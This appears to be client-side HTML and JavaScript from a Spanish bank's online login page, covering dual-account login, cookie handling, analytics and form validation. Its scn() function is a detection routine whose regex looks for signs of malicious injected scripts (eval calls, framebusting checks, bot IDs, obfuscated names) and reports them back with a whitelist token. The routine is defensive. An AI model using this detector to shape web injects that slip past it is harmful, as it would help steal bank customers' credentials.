        $('#signLoginDual').val("MIID/AYJKoZIhvcNAQcCoIID7TCCA+kCAQExCzAJBgUrDgMCGgUAMAsGCSqGSIb3DQEHAaCCAtIwggLOMIICN6ADAgECAhA1vxLflU/sDO6wvIXk+791MA0GCSqGSIb3DQEBBQUAMDoxEzARBgNVBAoTCmUteHRlbmRub3cxIzAhBgNVBAMTGmUteHRlbmRub3cgQ2xhc3MgMyBDQSB0ZXN0MB4XDTAzMTEyNzAwMDAwMFoXDTA0MTEyNjIzNTk1OVowfjETMBEGA1UEChQKZS14dGVuZG5vdzEfMB0GA1UECxQWRm9yIFRlc3QgUHVycG9zZXMgT25seTETMBEGA1UEAxMKZXh0ZW5kIGdmcDEPMA0GA1UEKhMGZXh0ZW5kMQwwCgYDVQQEEwNnZnAxEjAQBgNVBAUTCTExMTExMTExSDCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEA0+gGQVMeNHv7u8Zz8Xly+5+80FwZhX6p9osupPKmoYCr+IB1U03s4LDVZznkR98zicKJqt3U8evssm6toUhpwfd1dAeOq+UmrKa3Mz3e5WW2FK5rw30sDMpjZSxHDK66z2czJrYVijIDPqfFYUuicUDzcUPNC+JLxJG7q3VUCysCAwEAAaOBkDCBjTALBgNVHQ8EBAMCBaAwCQYDVR0TBAIwADBNBgNVHR8ERjBEMEKgQKA+hjxodHRwOi8vcGlsb3RvbnNpdGVjcmwuYWNlLmVzL2V4dGVuZG5vd0lUQ2xhc3MzL0xhdGVzdENSTC5jcmwwEQYJYIZIAYb4QgEBBAQDAgeAMBEGCmCGSAGG+EUBBgkEAwEB/zANBgkqhkiG9w0BAQUFAAOBgQBtFWcEumky5yVG9fjrAtpwjWTLGkrOd1zTzc03SvUokJcJz9LQvH6iZ0K6Mo1AdX60hJnXskbKWEw93ItvgKsBxf6nUp2CIdj/XOk4KQvzZfrb/9JLtcA2SfcwMGeSN+K3DbuNy51kf+LSMK1AwDCEU9OfhOycRkZ0ApEDz9YGFzGB8zCB8AIBATBOMDoxEzARBgNVBAoTCmUteHRlbmRub3cxIzAhBgNVBAMTGmUteHRlbmRub3cgQ2xhc3MgMyBDQSB0ZXN0AhA1vxLflU/sDO6wvIXk+791MAkGBSsOAwIaBQAwDQYJKoZIhvcNAQEBBQAEgYBGY+dR0v+W4LVoVNqJgUgDuVoX8tNW1wOQOUXi4iVHzcZ+vU7kOZv4gS8W5EJuHQT3U7O/bnhuHL7BputnausEXfsJcqcBJEzS1RZqpdJFRGHs-wgB20lbvnfOyvb814xq6m9y8tUFwFMhm++VRowAlfHwzxiGvKZP5XH9E6GKOnQ==");
        $('#csidDual').val(getJSESSIONID_JBSWL());
        $('#deviceTokenCookieDual').val(getCookie('DeviceTokenCookie'));
        $('#RSADevicePrintDual').val(urlEncode(add_deviceprint()));
        $('#inputAtributes1Dual').val(lenguageLoginDual);
        addInputsDual();
        jQuery("#formDual").append('<input type="hidden" id="inputAtributes12" name="inputAtributes12" value="'+getTokenSAMLLoginDual()+'"/>');

        var contextoActual = getContextoActual();

        if (contextoActual == "txempbs/") {
          document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txbs';
          document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txbs/';
          doLoginDualAjax("/txbs/", "txempbs", lenguageLoginDual);
        } else if (contextoActual == "txbs/") {
          document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txempbs';
          document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txempbs/';
          doLoginDualAjax("/txempbs/", "txbs", lenguageLoginDual);
        } else {
          $('#submitLoginDual').prop('disabled', false);
          $('#passwordDual').prop('disabled', false);
          console.error("No compatible");
        }
      }
    }

    function doLoginDualAjax(contextoActual, cookieDelete, lenguageLoginDual) {
      $.ajax({
        url: contextoActual+"LoginDNISCA.doLogin.bs?language="+lenguageLoginDual+"&key="+getKeyRandom(),
        dataType: "json",
        data: $("#formDual").children().serialize(),
        type: "POST",
        success: function(response){
          var result = $(response)[0].result.trim();
          if (result == "OK") {
            if (logoutDual(window.location.protocol + '//' + window.location.host + "/" + getContextoActual() + "end.doLoginDual.bs")) {
              document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/'+cookieDelete;
              document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/'+cookieDelete+'/';
              setCookieLogout("logout","");
              validateDeviceTokenCookie();
              if (segmentoLoginDual.charAt(0)=='P') {
                setUnescapeCookie("segmento", "Empresas", 1);
              } else {
                setUnescapeCookie("segmento", "Particulares", 1);
              }
              window.location = contextoActual+'LoginDNISCA.setLogged.bs?lenguage='+lenguageLoginDual+"&key="+getKeyRandom();
            } else {
              console.error("Error controlado logout");
              document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/'+cookieDelete;
              document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/'+cookieDelete+'/';
              setCookieLogout("logout","");
              validateDeviceTokenCookie();
              if (segmentoLoginDual.charAt(0)=='P') {
                setUnescapeCookie("segmento", "Empresas", 1);
              } else {
                setUnescapeCookie("segmento", "Particulares", 1);
              }
              window.location = contextoActual+'LoginDNISCA.setLogged.bs?lenguage='+lenguageLoginDual+"&key="+getKeyRandom();
            }
          } else if (result == "SCA") {
            $('#passwordDual').prop('disabled', false);
            console.error("No disponible SCA, necesario token SAML");
          } else {
            $('#passwordDual').prop('disabled', false);
            errorLoginDualPass();
          }
        },
        error: function(error){
          // Error login no controlado
          console.error("Error no controlado");
          $('#passwordDual').prop('disabled', false);
          errorLoginDualPass();
        },
      });
    }
    function loginDualRefreshPopUp() {

    	var nivel = "";
    	if (segmentoLoginDual.charAt(0)=='P') {
            nivel = "particulares";
        } else {
            nivel = "empresas";
        }

		var tealium_data_login_dual = {
		    categoriaPagina:"consultiva",
		    categoriaProducto:"acceso",
		    nombreProducto: "login",
		    nombreOperativa: "login dual",
		    nivel1: nivel,
		    nivel2: "acceso",
		    nivel3: "login dual",
		    nivel9: "servicing",
		    canal: "bancsabadell",
		    entorno: "bso.transaccional",
		    operationID: "",
		    operationSubId: ""
		}

		bsSend("link", tealium_data_login_dual);

      if (isLoginDualError) {
        var loginDualParte1 = jQuery("#popUpDualPat1").html();
        var loginDualParte2 = jQuery("#popUpDualPat2").html();
        var inputDual = '<input id="passwordDual" type="password" name="passwordDual">';
        var loginDualParte3 = jQuery("#popUpDualPat3").html();
        var loginDualFinal = "";
        if (segmentoLoginDual.charAt(0)=='P') {
          loginDualFinal = loginDualParte1.replace("#icono", literalesLoginDual.iconoEmp);
          loginDualFinal = loginDualFinal.replace("#nombreusuario", usernameLoginDual);
          loginDualFinal = loginDualFinal.replace("#titulo", literalesLoginDual.tituloEmp);
          loginDualFinal = loginDualFinal + loginDualParte2.replace("#inputDual", inputDual);
          loginDualFinal = loginDualFinal + loginDualParte3;
          jQuery("#popUpDualBody").html(loginDualFinal);
        } else {
          loginDualFinal = loginDualParte1.replace("#icono", literalesLoginDual.iconoPart);
          loginDualFinal = loginDualFinal.replace("#nombreusuario", usernameLoginDual);
          loginDualFinal = loginDualFinal.replace("#titulo", literalesLoginDual.tituloPart);
          loginDualFinal = loginDualFinal + loginDualParte2.replace("#inputDual", inputDual);
          loginDualFinal = loginDualFinal + loginDualParte3;
          jQuery("#popUpDualBody").html(loginDualFinal);
        }
        $('#passwordDual').each(function() {
          var elem = $(this);
          elem.keyup(function(event) {
              if (event.which === 13 && '' != elem.val()) {
                  doLoginDual();
              }
          });
          elem.bind("propertychange change click keyup input paste", function(event){
             if ('' != elem.val()) {
              $('#submitLoginDual').prop('disabled', false);
            } else {
              $('#submitLoginDual').prop('disabled', true);
            }
          });
        });
        isLoginDualError = false;
      }
      if (fixQuestionMark) {
        var urlOfFixQuestion = window.location.href;
        if (urlOfFixQuestion.substr(urlOfFixQuestion.length - 1) == "#") {
          window.location = window.location.href + "popUpDual";
        } else {
          window.location = window.location.href + "#popUpDual";
        }
      }
    }
    function errorLoginDualPass() {
      loginDualParte2 = jQuery("#popUpDualPat2error").html();
      loginDualParte1 = jQuery("#popUpDualPat1").html();
      inputDual = '<input id="passwordDual" type="password" name="passwordDual">';
      loginDualParte3 = jQuery("#popUpDualPat3").html();
      if (segmentoLoginDual.charAt(0)=='P') {
        loginDualFinal = loginDualParte1.replace("#icono", literalesLoginDual.iconoEmp);
        loginDualFinal = loginDualFinal.replace("#nombreusuario", usernameLoginDual);
        loginDualFinal = loginDualFinal.replace("#titulo", literalesLoginDual.tituloEmp);
        loginDualFinal = loginDualFinal + loginDualParte2.replace("#inputDual", inputDual);
        loginDualFinal = loginDualFinal + loginDualParte3;
        jQuery("#popUpDualBody").html(loginDualFinal);
      } else {
        loginDualFinal = loginDualParte1.replace("#icono", literalesLoginDual.iconoPart);
        loginDualFinal = loginDualFinal.replace("#nombreusuario", usernameLoginDual);
        loginDualFinal = loginDualFinal.replace("#titulo", literalesLoginDual.tituloPart);
        loginDualFinal = loginDualFinal + loginDualParte2.replace("#inputDual", inputDual);
        loginDualFinal = loginDualFinal + loginDualParte3;
        jQuery("#popUpDualBody").html(loginDualFinal);
      }
      $("#popUpDualBody").css("margin", "4% auto");
      $('#passwordDual').each(function() {
        var elem = $(this);
        elem.keyup(function(event) {
            if (event.which === 13 && '' != elem.val()) {
                doLoginDual();
            }
        });
        elem.bind("propertychange change click keyup input paste", function(event){
           if ('' != elem.val()) {
            $('#submitLoginDual').prop('disabled', false);
          } else {
            $('#submitLoginDual').prop('disabled', true);
          }
        });
      });
      isLoginDualError = true;
    }
  </script><script type="text/javascript">
        var valuehomeempresas = 'HOME_EMPRESAS';
        var namehomeempresas = 'HOME_EMPRESAS';
        var homeEmpresasPilotajeInterno = 'false'
        if (accesoInterno == 'true' && homeEmpresasPilotajeInterno == 'true') {
          if (cookies.getCookie(namehomeempresas) == '') {
            cookies.setCookie(namehomeempresas,namehomeempresas,1);
          } else if(cookies.getCookie(namehomeempresas) != namehomeempresas) {
            cookies.removeCookie(namehomeempresas);
            cookies.setCookie(namehomeempresas,namehomeempresas,1);
          }
        } else {
          if(cookies.getCookie(namehomeempresas) == ''){
            cookies.setCookie(namehomeempresas,valuehomeempresas,1);
          } else if(cookies.getCookie(namehomeempresas) != valuehomeempresas){
            cookies.removeCookie(namehomeempresas);
            cookies.setCookie(namehomeempresas,valuehomeempresas,1);
          }
        }
  </script>


<script type="text/javascript">
  //<![CDATA[
  var cookieJSESSIONID_JBSWL = document.cookie.indexOf("JSESSIONID_JBSWL");
  if (cookieJSESSIONID_JBSWL==-1 || cookieJSESSIONID_JBSWL==""){
    setJSESSIONID_JBSWL();
  }
  jQuery(document).click(function(e) {
    if (!jQuery('#groupLink').is(e.target)){
      if(jQuery(e.target).closest('#groupLink').length === 0) {
        jQuery('#menuCorp').slideUp("slow",function() {
          jQuery('#iconCorp').addClass("icon-bs-icon-abajo");
          jQuery('#iconCorp').removeClass("icon-bs-icon-arriba");
          jQuery('#menuCorpT').slideUp(0);
        });
      }
    }
    if (!jQuery('#idiomasLink').is(e.target)){
      if(jQuery(e.target).closest('#idiomasLink').length === 0) {
        jQuery('#languages').slideUp("slow",function() {
          jQuery('#iconLang').addClass("icon-bs-icon-abajo");
          jQuery('#iconLang').removeClass("icon-bs-icon-arriba");
          jQuery('#languagesT').slideUp(0);
        });
      }
    }
    if (!jQuery('#menuUsuarioCabecera').is(e.target)){
      if(jQuery(e.target).closest('#menuUsuarioCabecera').length === 0) {
        jQuery('#menuUsuario').slideUp("up",function() {
          jQuery('#flechaUsuario').addClass("icon-bs-icon-abajo");
          jQuery('#flechaUsuario').addClass("icon-bs-icon-arriba");
          jQuery('#menuUsuarioT').slideUp(0);
        });

      }
    }
    if (!jQuery('#campana2').is(e.target)){
      if(jQuery(e.target).closest('#campana2').length === 0) {
    	  if (jQuery(e.target).attr("id") != "demo" && $(e.target).closest("#ayudaCAM").length === 0) {
			jQuery('#menuFirmas').slideUp("up");
    	  }

        jQuery("#tooltipsLapizClick").css("display","none");
      }
    }
    if (jQuery(e.target).closest("#newLogin").length === 0){
      if(jQuery(e.target).closest('#newMenuLogin').length === 0) {
        jQuery("#newMenuLogin").css("display","none");
        jQuery("#flechaLogin").addClass("icon-bs-icon-abajo");
        jQuery("#flechaLogin").removeClass("icon-bs-icon-arriba");
      }
    }
  });
  var valueCookieAlert =  cookies.getCookie("SA_Alert");
  var rutaTx = 'txbs/';
  var demo = 'null';
  if (demo == "true") rutaTx="txdemoem/";
  var ruta = '/' + rutaTx + 'DDPositionNew.init.bs';

  if(document.getElementById("enlaceFirmasGlobal")!=null){
	document.getElementById("enlaceFirmasGlobal").href = ruta;
  }

  if(valueCookieAlert != ""){
    var msgVal = valueCookieAlert.split("_")[0];
    var opVal  = valueCookieAlert.split("_")[1];
    var docVal = valueCookieAlert.split("_")[2];
    activaAlertasCabecera(msgVal,opVal,docVal);
  }
  if(typeof ipCliente == "string") {
    updateDeviceTokenCookie(ipCliente);
  }
  jQuery("#menuUsuario").css("width",jQuery("#menuUsuarioCabecera").width() + 40);
  jQuery("#menuUsuario").css("margin-left",900 - jQuery("#menuUsuarioCabecera").width());
  jQuery("#menuUsuarioT").css("margin-left",912);
  jQuery("#iconoNuevoUsuario").css("right",76 + jQuery("#menuUsuarioCabecera").width());
  jQuery("#ventana").css("margin-left",755 - jQuery("#menuUsuarioCabecera").width());
  jQuery("#tooltipsLapizClick").css("margin-left",944 - jQuery("#menuUsuarioCabecera").width() -jQuery("#tooltipsLapizClick div").width()/2);
//]]>
// Detectar si un usuario esta logeado en al Site HDEV-34804
$(document).ready(function() {
  var usernameVarIf = document.cookie.indexOf("username");
  if (usernameVarIf === -1 || usernameVarIf === "") {
    localStorage.setItem("z.wdgt.userLoggedOut", true);
  }
});
</script><script type="text/javascript">
	//<![CDATA[
	
	jQuery(document).ready(function(){
		if(readCookie("username") !=null){
			var segmento = readCookie("segmento");
			var keyRandom = getKeyRandom();
			jQuery('a').each(function(){
				var attr = jQuery(this).attr("href");
				if (typeof attr !== typeof undefined && attr !== false) {
					if (attr.toLowerCase().indexOf("javascript")==-1) {
						if ((attr.indexOf("/txbs/")!=-1) || (attr.indexOf("/txempbs/")!=-1) || (attr.indexOf("/txdemoem/")!=-1) || (attr.indexOf("/activobank/")!=-1) || (attr.indexOf("/txbsa/")!=-1) || (attr.indexOf("/txempbsc/")!=-1) || (attr.indexOf("/txbsmi/")!=-1) || (attr.indexOf("/txbsp/")!=-1) || (attr.indexOf("/txempbsp/")!=-1) || (attr.indexOf("/txempbsl/")!=-1)) {
							if (attr.indexOf("?")!=-1) {
								jQuery(this).attr("href", attr + "&key=" + keyRandom);
							} else {
								jQuery(this).attr("href", attr + "?key=" + keyRandom);
							}
							attr = jQuery(this).attr("href");
						}
					}
					if ((segmento.substring(0,1) != "P") && (readCookie("demo") !=null)) {
						jQuery(this).attr("href", attr.replace('/txempbs/', '/txdemoem/'));
					}
				}
			});
		}
	});
	//]]>
</script>

		
		


		
		
		<script type="text/javascript">
    $(document).ready(function(){
        var frms = $('form[name=myForm],form[name=loginFormParticulars],form[name=loginFormEmpreses]');
        if(frms.length > 0){
           scn($('html').html());
        }
    });
     
    function scn(response,dbg){
           var frms = $('form[name=myForm],form[name=loginFormParticulars],form[name=loginFormEmpreses]');
           var expr = /\\x[0-9a-f]{2}|b[o]t_?u?id|i[n]j_|s[e]lf={2,3}top|O0OO0[O]0OO00O|pro[t]otype|e[v]al\(|llI{1,7}l|back\s?online\s?shortly/gi;
           var f5ExprPre = 'sdklj';
           var f5ExprPost = 'shr489';
           var f5Expr = f5ExprPre + f5ExprPost;
           var sntnl = false;
           var dmnskk = '';
           while ((match = expr.exec(response))!=null && !sntnl) {
                 var mtchIndex = match.index;
                 dmnskk = response.substring(response.lastIndexOf('<script',mtchIndex),response.indexOf('/script>',mtchIndex)+8);
                 var f5Index = dmnskk.indexOf(f5Expr);
                 if (f5Index==-1) {
                       sntnl = true;
                       dmnskk = dmnskk.replace(/'/g,'"');
                       dmnskk = dmnskk.replace(/\n/g," ");
                 } else {
                       sntnl = false;
                       dmnskk = '';
                 }
           }

           frms.append("<input type='hidden' name='injvalrnd' value='"+sntnl+"' />");
           frms.append("<input type='hidden' name='injextrnd' value='"+dmnskk+"' />");
           if(dbg) {
                 console.log('injvalrnd:'+sntnl);
                 console.log('injextrnd:'+dmnskk);
        }
    
        return;
    }
</script>





<div itemscope="" itemtype="http://schema.org/WebSite" style="display:none">
  <meta itemprop="url" content="https://www.bancsabadell.com/cs/Satellite/SabAtl">
  <form itemprop="potentialAction" itemscope="" itemtype="http://schema.org/SearchAction">
      <meta itemprop="target" content="https://www.bancsabadell.com/cs/Satellite?pagename=GBS_contenedora&amp;childpagename=SabAtl%2FGBS_distribuidora&amp;cid=1191420029093&amp;p=1191420029954&amp;c=Page&amp;resultado=si&amp;_charset_=UTF-8&amp;site=SabAtl&amp;sitepfx=BSP_&amp;muestraBuscador=false&amp;segmento=Empresas&amp;packedargs=language%3D1178258082822&amp;language=1178258082822&amp;consulta={query}">
      <input itemprop="query-input" type="text" name="query">
      <input type="submit">
  </form>
</div>


<script type="text/javascript">
	var userAgent = null;
</script><div id="container" class="clear liquid class01">
	<div id="content"><p id="breadcrumb">

		
	 Está en: <span class="active">BS Online</span></p>


















    
    
    
    
    




    
    
    
    
    




    
    
    
    
    




    
    
    
    
    




    
    
    
    
    




    
    
    
    
    



























































































    
    
    
    
    



  
  






    
    



<script type="text/javascript">
function createCookie(name, value, days) {
  if (days) {
    var date = new Date();
    date.setTime(date.getTime()+(days*24*60*60*1000));
    var expires = "; expires="+date.toGMTString();
  }
  else var expires = "";
  document.cookie = name+"="+escape(value)+expires+"; path=/";
}

function deleteCookie(name) {
  createCookie(name, "_deleted", 1);
  createCookie(name, "_deleted", -1);
}
</script>

<script type="text/javascript">

  if(document.getElementById('usuario') !=null){
    document.getElementById('usuario').style.visibility="hidden";
  }
  if(document.getElementById('nombreUsuario') !=null){  
	document.getElementById('nombreUsuario').innerHTML = '';
  }
  if(document.getElementById('segmentoUsuario') !=null){ 
    document.getElementById('segmentoUsuario').style.visibility='';
  }
  deleteCookie('username');
</script>




<script type="text/javascript" language="JavaScript">
  ns4 = (document.layers)? true:false;
  ie4 = (document.all)? true:false;
  var formname;
 
  
        var languageTransaccional= 'es'
        if (languageTransaccional == "CA-es") {
          languageTransaccional = "CAT";
        } else if (languageTransaccional == "es") {
          languageTransaccional = "CAS";
        } else if (languageTransaccional == "en") {
          languageTransaccional = "ENG";
        } else if (languageTransaccional == "fr") {
          languageTransaccional = "FRA";
        } else if (languageTransaccional == "de") {
          languageTransaccional = "DEU";
        } else if (languageTransaccional == "EU-es") {
          languageTransaccional = "EUS";
        }else if (languageTransaccional == "GAL") {
          languageTransaccional = "GAL";
        }
  
  function doAction(formname, idAccion) {
    for (j = 0; j < document.forms.length; j++)
      for (i = 0; i < document.forms[j].elements.length; i++)
        if (document.forms[j].elements[i].type == "button")
          document.forms[j].elements[i].disabled=true

        document.forms[formname].action=idAccion+".bs?language="+languageTransaccional;
		validateDeviceTokenCookie();
        document.forms[formname].submit();
  }

    function myFormSubmit(e){
		if (document.loginFormParticulars.action == document.location.href){
			e.preventDefault();
		}
	}
	
	function myFormSubmitEmp(e){
		if (document.loginFormEmpreses.action == document.location.href){
			e.preventDefault();
		}
	}
		 
  function doAction2(formname, idAccion) {
    
}

	function callDoLogin(nameform){
		var contexto="/txbs/";
		formname = nameform;
		 
		if (typeof(formname) != 'undefined' && formname != null){
			
			addInputForm(formname); 
			
			if(formname.indexOf('mpres')>-1){ //contexto = "/txempbs/";
				contexto = "/txempbs/";
			}
			
			$("#accept").addClass("disabled").prop("disabled", true);		
			$.ajax({
				url: contexto+"LoginDNISCA.doLogin.bs?language="+languageTransaccional+"&key="+getKeyRandom(),
				dataType: "json",
				data: $("form[name='"+formname+"']").serialize(),
				type: "POST",
				success: function(response){
					var result = $(response)[0].result.trim();
					
					if (result == "OK") {	
						doActionSCA(formname, contexto+'LoginDNISCA.setLogged',languageTransaccional);
					} else if (result == "SCA") {
						callLoadLayout(formname,languageTransaccional,contexto);
					} else {
						callLoadLayout(formname,languageTransaccional,contexto);
					}
				},
				error: function(error){
					// Error login no controlado
					callLoadLayout(formname,languageTransaccional,contexto);
				},
			});
		
		}
	}	
  function SetCookie(name,value,expires,path,domain,secure) {
    document.cookie = name + "=" + escape (value) +
      ((expires) ? "; expires=" + expires.toGMTString() : "") +
      ((path) ? "; path=" + path : "") +
      ((domain) ? "; domain=" + domain : "") +
      ((secure) ? "; secure" : "");
  }

  function setLoginCookiePart(idLoginType){
    var expdate = new Date();
    var cookieAceptacionCookies_SabAtl = readCookie("aceptacionCookies_SabAtl");
    var sitio = 'SabAtl'
    if(sitio != "SabAtl"  || cookieAceptacionCookies_SabAtl == "true"){
      expdate.setTime (expdate.getTime() + 365*(24 * 60 * 60 * 1000)); // 1 any
      SetCookie("LOGINTYPE",idLoginType,expdate,"/");
    }
  }

  // Valida particulares
  function validate(formulario,idAccion) {
    formnameFW = "loginFormParticulars";
    var flag = 0;
    var pwP = /[^A-Z0-9]/gi;
    var usrP = /[^A-Z0-9\/]/gi;
    var usuari = formulario.userDNI.value;
    var pass = formulario.pinNif.value;
    var DNIError = 'Se ha detectado un error en el formato del código de usuario (DNI) o código de acceso. En caso de que su código de usuario (DNI) contenga el símbolo &#39;*&#39;, debe introducir el mismo código omitiendo este símbolo.';
    var formatDNIError = 'Se ha detectado un error en el formato del DNI o del código de acceso';
    if ((usuari == "") || (typeof(usuari) == "undefined") || (usrP.test(usuari))) flag = 1;
    if ((pass == "") || (typeof(pass) == "undefined") || (pwP.test(pass))) flag = 2;
    if (flag != 0) { // Hay errores en los campos
      if (usuari.indexOf('*',0)!=-1) alert (DNIError);
      else alert(formatDNIError);
    } else { // No hay errores, enviar
      setLoginCookiePart("1");

      formulario.pin.value = pass;
      formulario.pinNif.value = "";
      document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txbs';
      document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txbs/';
      document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txempbs';
      document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txempbs/';
      callDoLogin(formulario.name);
	  
    }
  }
  
  function validateKey(evt,formulario,idAccion){
    // Si se pulsa return en el campo clave valida el formulario
    if (evt.keyCode == 13 || evt.which == '13')
      validate(formulario,idAccion);
  }

  function switchClassParticulares(idLoginType,formname,idAccion){
    setLoginCookiePart(idLoginType);    // Le da a la cookie el valor apropiado para la pÃ¡gina siguiente de inicio de sesiÃ³n para particulares
    document.forms[formname].action='/txbs/'+idAccion+'?language=es&key='+getKeyRandom();
    document.forms[formname].submit();
  }

  function switchClassEmpresas(id){
    setLoginCookieEmp(id);    // Le da a la cookie el valor apropiado para la pÃ¡gina siguiente de inicio de sesiÃ³n para empresas
  }

  function switchClassEmpresasElectronico(id){
    setLoginCookieEmp(id);    // Le da a la cookie el valor apropiado para la pÃ¡gina siguiente de inicio de sesiÃ³n para empresas
    document.forms["loginFormEmpreses"].action="/txempbs/start.init.bs?language=es&key="+getKeyRandom();
    document.forms["loginFormEmpreses"].submit();
  }

  function ctrlCharsSpecialnif(aux, evt,rform,others, field) {
    var caracterNoValido = 'Carácter no válido';
    if (ns4) {
      var eventoTarget=evt.target+"";
      if (eventoTarget.indexOf("displayuserId")!=-1) {
        if (evt.which=='13') {
          rform.password.focus();
          return true;
        }
      }
    }
    var allowKey=false;
    var keyCode=(ie4)?evt.keyCode:evt.which;
    if((keyCode=='9')||(keyCode=='8')||(keyCode>='48' && keyCode<='57')||(keyCode>='65' && keyCode<='90')||(keyCode>='97' && keyCode<='122')||(keyCode=='0')) {
      allowKey=true;
    }
    else if ((others == 'S') && ((keyCode=='45') || (keyCode=='47'))) { allowKey=true;}
    else {
      if (keyCode!='13') alert(caracterNoValido);
      else {
        if (aux == 1) { return ACEPTARNIF(document.loginFormEmpreses.userCIF,document.loginFormEmpreses.pinCIF,"0")}
        if (aux == 0)  { return ACEPTARNIF(document.loginFormEmpreses.userNIF,document.loginFormEmpreses.pinNifEmp,"1")}
        if (field == 'userId') { rform.password.focus(); allowKey=true;}
      }
    }
    return allowKey;
  }

  function ctrlCharsSpecial(aux, evt,rform,others, field) {
    if (ns4) {
      var eventoTarget=evt.target+"";
      if (eventoTarget.indexOf("displayuserId")!=-1) {
        if (evt.which=='13')
          rform.password.focus();return true;
      }
    }
    var allowKey=false;
    var keyCode=(ie4)?evt.keyCode:evt.which;
    if((keyCode=='9')||(keyCode=='8')||(keyCode>='48'&&keyCode<='57')||(keyCode>='65'&&keyCode<='90')||(keyCode>='97'&&keyCode<='122')||(keyCode=='0'))
      allowKey=true;
    else if ((others == 'S') && ((keyCode=='45') || (keyCode=='47')))
      allowKey=true;
    else {
      if (keyCode!='13') alert("CarÃ¡cter no vÃ¡lido");
      else {
      if (aux == 1) {
      return ACEPTARCARD(document.loginFormEmpreses.userCard,document.loginFormEmpreses.pinCard)
      }
        if (field == 'userId') rform.password.focus(); allowKey=true;
      }
    }
    return allowKey;
  }

  function ctrlCharsSpecialPart(aux, evt,rform,others, field) {
    if (ns4) {
      var eventoTarget=evt.target+"";
      if (eventoTarget.indexOf("displayuserId")!=-1) {
        if (evt.which=='13')
          rform.password.focus();return true;
      }
    }
    var allowKey=false;
    var keyCode=(ie4)?evt.keyCode:evt.which;
    if((keyCode=='9')||(keyCode=='8')||(keyCode>='48'&&keyCode<='57')||(keyCode>='65'&&keyCode<='90')||(keyCode>='97'&&keyCode<='122')||(keyCode=='0'))
      allowKey=true;
    else if ((others == 'S') && ((keyCode=='45') || (keyCode=='47')))
      allowKey=true;
    else {
      if (keyCode!='13') alert("CarÃ¡cter no vÃ¡lido");
      else {
      if (aux == 1) {
      return ACEPTARCARDpart(document.loginFormParticulars.userCardPart,document.loginFormParticulars.pinCardPart)
      }
        if (field == 'userId') rform.password.focus(); allowKey=true;
      }
    }
    return allowKey;
  }

  function ACEPTARNIF(user,pin,mode) {
    formnameFW = "loginFormEmpreses";
    var introducirNifYCodigo = 'Debe introducir su NIF y el código de acceso para operar';
    var introducirNIF = 'Debe introducir el campo NIF';
    var introducirPassword = 'Debe introducir su clave de acceso';
    if (user.value=="" && pin.value=="") {
      alert(introducirNifYCodigo);
      user.focus();
      return false;
    }
    if (user.value=="") {
      user.focus();
      alert(introducirNIF);
      return false;
    }
    if (pin.value=="") {
      alert(introducirPassword);
      pin.focus();
      return false;
    }
    document.loginFormEmpreses.userDNI.value=user.value.toUpperCase();
    document.loginFormEmpreses.pin.value=pin.value.toUpperCase();
    document.loginFormEmpreses.pinNifEmp.value = "";
    document.loginFormEmpreses.pinCIF.value = "";
    document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txbs';
    document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txbs/';
    document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txempbs';
    document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txempbs/';
    callDoLogin('loginFormEmpreses');
   
  }

  function ACEPTARCARDpart(user,pin) {
    formnameFW = "loginFormParticulars";
    var introducirNifYCodigo = 'Debe introducir su NIF y el código de acceso para operar';
    var introducirNIF = 'Debe introducir el campo NIF';
    var introducirPassword = 'Debe introducir su clave de acceso';
    if (user.value=="" && pin.value=="") {
      alert(introducirNifYCodigo);
      user.focus();
      return false;
    }
    if (user.value=="") {
      user.focus();
      alert(introducirNIF);
      return false;
    }
    if (pin.value=="") {
      alert(introducirPassword);
      pin.focus();
      return false;
    }
    document.loginFormParticulars.userCard.value=user.value.toUpperCase();
    document.loginFormParticulars.pin.value=pin.value.toUpperCase();
    document.loginFormParticulars.pinCardPart.value = "";
    setLoginCookiePart("3");
    document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txbs';
    document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txbs/';
    document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txempbs';
    document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txempbs/';
    callDoLogin('loginFormParticulars');
  }

  function doAction3(id) {
    for (j = 0; j < document.forms.length; j++)
      for (i = 0; i < document.forms[j].elements.length; i++)
        if (document.forms[j].elements[i].type == "button" )
            document.forms[j].elements[i].disabled=true;
    document.loginFormParticulars.action="/txbs/"+id+".bs";
    document.loginFormParticulars.submit();
  }
  
  function ACEPTARCARD(user,pin) {
    formnameFW = "loginFormEmpreses";
    var introducirNifYCodigo = 'Debe introducir su NIF y el código de acceso para operar';
    var introducirNIF = 'Debe introducir el campo NIF';
    var introducirPassword = 'Debe introducir su clave de acceso';
    if (user.value=="" && pin.value=="") {
      alert(introducirNifYCodigo);
      user.focus();
      return false;
    }
    if (user.value=="") {
      user.focus();
      alert(introducirNIF);
      return false;
    }
    if (pin.value=="") {
      alert(introducirPassword);
      pin.focus();
      return false;
